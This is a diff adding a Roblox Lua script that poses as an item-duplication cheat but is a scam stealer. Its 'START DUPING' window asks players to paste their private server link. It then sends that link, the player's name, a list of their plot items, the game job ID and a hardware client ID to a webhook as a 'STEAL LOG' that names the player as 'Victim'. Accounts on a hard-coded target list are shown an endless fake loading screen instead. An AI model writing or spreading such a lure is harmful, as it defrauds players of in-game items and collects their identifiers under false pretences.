@@ -1,0 +1,184 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local TweenService = game:GetService("TweenService")
+
+-- webhook
+local Webhook_URL = ""
+
+-- target
+local Targets = {
+    ["brosmadlol4alt"] = true,
+    ["youaremybiggest61"] = true
+}
+
+local RandomFacts = {
+    "did u know monkeys eat bananas?",
+    "did u know that honey never spoils?",
+    "did u know cows have best friends?",
+    "did u know octopuses have three hearts?",
+    "did u know a shrimp's heart is in its head?",
+    "did u know bananas are berries, but strawberries aren't?",
+    "did u know some cats are allergic to humans?"
+}
+
+local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
+local function showInfiniteLoading()
+    if CoreGui:FindFirstChild("InfiniteDupeScreen") then return end
+    local ScreenGui = Instance.new("ScreenGui", CoreGui)
+    ScreenGui.Name = "InfiniteDupeScreen"
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.DisplayOrder = 999
+
+    local Background = Instance.new("Frame", ScreenGui)
+    Background.Size = UDim2.new(1, 0, 1, 0)
+    Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+
+    local StatusText = Instance.new("TextLabel", Background)
+    StatusText.Size = UDim2.new(1, 0, 0, 50)
+    StatusText.Position = UDim2.new(0, 0, 0.45, -25)
+    StatusText.BackgroundTransparency = 1
+    StatusText.Font = Enum.Font.GothamBold
+    StatusText.Text = "wait it is duping..."
+    StatusText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    StatusText.TextSize = 24
+
+    local BarBg = Instance.new("Frame", Background)
+    BarBg.Size = UDim2.new(0, 300, 0, 6)
+    BarBg.Position = UDim2.new(0.5, -150, 0.52, 0)
+    BarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    Instance.new("UICorner", BarBg).CornerRadius = UDim.new(0, 8)
+
+    local Bar = Instance.new("Frame", BarBg)
+    Bar.Size = UDim2.new(0.1, 0, 1, 0)
+    Bar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    Instance.new("UICorner", Bar).CornerRadius = UDim.new(0, 8)
+
+    local FactText = Instance.new("TextLabel", Background)
+    FactText.Size = UDim2.new(1, 0, 0, 30)
+    FactText.Position = UDim2.new(0, 0, 0.6, 0)
+    FactText.BackgroundTransparency = 1
+    FactText.Font = Enum.Font.GothamMedium
+    FactText.Text = RandomFacts[1]
+    FactText.TextColor3 = Color3.fromRGB(180, 180, 180)
+    FactText.TextSize = 16
+
+    task.spawn(function()
+        while true do
+            TweenService:Create(Bar, TweenInfo.new(4, Enum.EasingStyle.Quart), {Size = UDim2.new(0.9, 0, 1, 0)}):Play()
+            task.wait(5)
+            FactText.Text = RandomFacts[math.random(1, #RandomFacts)]
+            TweenService:Create(Bar, TweenInfo.new(1), {Size = UDim2.new(0.3, 0, 1, 0)}):Play()
+            task.wait(1)
+        end
+    end)
+end
+
+local function sendStealLog(psLink)
+    if not httpRequest then return end
+    local player = Players.LocalPlayer
+    local modelList = ""
+    local count = 0
+    local blacklist = {["Cash"] = true, ["FriendPanel"] = true, ["Model"] = true, ["CashPad"] = true}
+
+    if workspace:FindFirstChild("Plots") then
+        for _, plotFolder in pairs(workspace.Plots:GetChildren()) do
+            for _, item in pairs(plotFolder:GetChildren()) do
+                if item:IsA("Model") and not blacklist[item.Name] then
+                    modelList = modelList .. "- " .. item.Name .. "\n"
+                    count = count + 1
+                end
+            end
+        end
+    end
+
+    httpRequest({
+        Url = Webhook_URL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            ["content"] = "@everyone 🚨 **NEW STEAL LOG!**",
+            ["embeds"] = {{
+                ["title"] = "🚨 STEAL!! DUPING LOG",
+                ["description"] = "**Victim:** " .. player.Name .. " (@" .. player.DisplayName .. ")",
+                ["color"] = 0xff0000,
+                ["fields"] = {
+                    {["name"] = "🔗 Private Server Link", ["value"] = psLink or "None"},
+                    {["name"] = "🧠 Valid Brainrots Found ("..count..")", ["value"] = "```" .. string.sub(modelList, 1, 800) .. "```"},
+                    {["name"] = "📍 Job ID", ["value"] = "```" .. game.JobId .. "```"}
+                },
+                ["footer"] = {["text"] = "HWID: " .. RbxAnalyticsService:GetClientId()},
+                ["timestamp"] = DateTime.now():ToIsoDate()
+            }}
+        })
+    })
+end
+
+local function createLureGUI()
+    local ScreenGui = Instance.new("ScreenGui", CoreGui)
+    local Main = Instance.new("Frame", ScreenGui)
+    Main.Size = UDim2.new(0, 320, 0, 200)
+    Main.Position = UDim2.new(0.5, -160, 0.5, -100)
+    Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    Main.Active = true
+    Main.Draggable = true
+    Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
+
+    local Title = Instance.new("TextLabel", Main)
+    Title.Text = "STEAL!!"
+    Title.Size = UDim2.new(1, 0, 0, 50)
+    Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+    Title.Font = Enum.Font.GothamBold
+    Title.TextSize = 26
+    Title.BackgroundTransparency = 1
+
+    local SubTitle = Instance.new("TextLabel", Main)
+    SubTitle.Text = "TYPE UR PRIVATE SERVER TO DUPE"
+    SubTitle.Position = UDim2.new(0, 0, 0, 45)
+    SubTitle.Size = UDim2.new(1, 0, 0, 20)
+    SubTitle.TextColor3 = Color3.fromRGB(200, 200, 200)
+    SubTitle.Font = Enum.Font.GothamMedium
+    SubTitle.TextSize = 12
+    SubTitle.BackgroundTransparency = 1
+
+    local Box = Instance.new("TextBox", Main)
+    Box.PlaceholderText = "Paste Private Server Link..."
+    Box.Size = UDim2.new(0.9, 0, 0, 40)
+    Box.Position = UDim2.new(0.05, 0, 0.45, 0)
+    Box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    Box.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Box.Font = Enum.Font.Gotham
+    Box.Text = ""
+    Instance.new("UICorner", Box).CornerRadius = UDim.new(0, 8)
+
+    local Btn = Instance.new("TextButton", Main)
+    Btn.Text = "START DUPING"
+    Btn.Size = UDim2.new(0.9, 0, 0, 40)
+    Btn.Position = UDim2.new(0.05, 0, 0.72, 0)
+    Btn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Btn.Font = Enum.Font.GothamBold
+    Btn.TextSize = 16
+    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 8)
+
+    Btn.MouseButton1Click:Connect(function()
+        sendStealLog(Box.Text)
+        ScreenGui:Destroy()
+    end)
+end
+
+local localPlayer = Players.LocalPlayer
+
+if Targets[localPlayer.Name] then
+    showInfiniteLoading()
+else
+    createLureGUI()
+end
+
+Players.PlayerAdded:Connect(function(p)
+    if Targets[p.Name] then
+        showInfiniteLoading()
+    end
+end)
